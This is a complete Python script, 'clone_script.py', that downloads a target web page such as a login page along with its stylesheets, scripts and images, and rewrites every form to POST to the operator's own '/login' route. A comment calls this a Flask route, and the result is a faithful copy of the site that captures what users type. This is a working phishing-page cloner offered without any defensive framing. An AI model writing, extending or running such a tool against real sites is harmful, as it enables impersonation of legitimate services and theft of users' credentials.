# clone_script.py

import requests
from bs4 import BeautifulSoup
import os
import re
import sys
from urllib.parse import urljoin, urlparse

def clone_page(url, output_folder="cloned_site", new_form_action="/login"):
    """
    Fetch the HTML from `url`, parse it, rewrite forms to post to `new_form_action`,
    and download linked CSS, JS, and images. Save everything into `output_folder`.
    """

    # Make sure the output folder exists
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"[-] Error fetching page: {e}")
        return

    soup = BeautifulSoup(response.text, 'html.parser')

    # 1. Rewrite all form actions to point to our Flask /login (POST) route
    for form in soup.find_all('form'):
        form['action'] = new_form_action
        form['method'] = 'POST'

    # 2. Download resources and fix references: CSS, JS, Images
    # We'll store them in `output_folder` and update the HTML to reference them locally.
    download_and_rewrite_resources(soup, url, output_folder)

    # 3. Save the modified HTML as index.html (or a custom name)
    output_html_path = os.path.join(output_folder, "index.html")
    with open(output_html_path, "w", encoding='utf-8') as f:
        f.write(str(soup))

    print(f"[+] Successfully cloned {url}")
    print(f"[+] Modified page saved to {output_html_path}")

def download_and_rewrite_resources(soup, base_url, output_folder):
    """
    Find and download CSS, JS, and image files referenced in the HTML.
    Update their HTML references to point to the local copies.
    """
    tags_attrs = {
        'img': 'src',
        'script': 'src',
        'link': 'href'
    }

    for tag, attr in tags_attrs.items():
        for element in soup.find_all(tag):
            if element.has_attr(attr):
                original_url = element[attr]

                # Ignore anchors/links that are not CSS references
                if tag == 'link':
                    # We only want to download if it's a CSS file
                    if ('stylesheet' not in element.get('rel', [])):
                        continue

                # Build absolute URL
                resource_url = urljoin(base_url, original_url)

                # Some references might be "data:..." or other non-http sources
                if not resource_url.startswith('http'):
                    continue

                # Download the resource
                local_filename = download_resource(resource_url, output_folder)
                if local_filename:
                    # Update the HTML to reference the local file
                    # We'll place it in the same directory, so just use the filename
                    element[attr] = local_filename

def download_resource(resource_url, output_folder):
    """
    Download a single resource (CSS/JS/Image) and save it into output_folder.
    Returns the saved filename if successful, or None if failed.
    """
    try:
        r = requests.get(resource_url, timeout=10)
        r.raise_for_status()
    except requests.exceptions.RequestException:
        return None

    # Determine a local filename
    parsed_url = urlparse(resource_url)
    file_name = os.path.basename(parsed_url.path)

    # If there's no valid file name, create one
    if not file_name:
        # e.g., a URL ending with "/"
        file_name = "index"

    # Very naive approach to avoid collisions
    local_path = os.path.join(output_folder, file_name)

    # Write the content
    try:
        with open(local_path, 'wb') as f:
            f.write(r.content)
    except OSError:
        return None

    return file_name

if __name__ == "__main__":
    """
    Usage:
        python clone_script.py <URL> [output_folder]
    Example:
        python clone_script.py https://example.com/login cloned_site
    """
    if len(sys.argv) < 2:
        print("Usage: python clone_script.py <URL> [output_folder]")
        sys.exit(1)

    url_to_clone = sys.argv[1]
    if len(sys.argv) >= 3:
        output_dir = sys.argv[2]
    else:
        output_dir = "cloned_site"

    clone_page(url_to_clone, output_folder=output_dir, new_form_action="/login")
